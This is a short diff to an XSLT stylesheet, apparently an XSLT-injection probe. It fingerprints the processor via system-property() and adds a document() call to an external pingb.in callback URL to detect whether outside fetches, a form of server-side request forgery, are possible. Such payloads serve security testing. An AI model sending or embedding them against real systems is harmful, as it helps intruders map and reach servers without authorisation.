@@ -6,5 +6,6 @@ xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
     XSLT Version: <xsl:value-of select="system-property('xsl:version')" />
     XSLT Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
     XSLT Vendor URL: <xsl:value-of select="system-property('xsl:version-url')" />
+    <xsl:variable name="name3" select="document('http://pingb.in/4cd02dfed1c894c72e0752a5a99a')" />
 </xsl:template>
 </xsl:stylesheet>
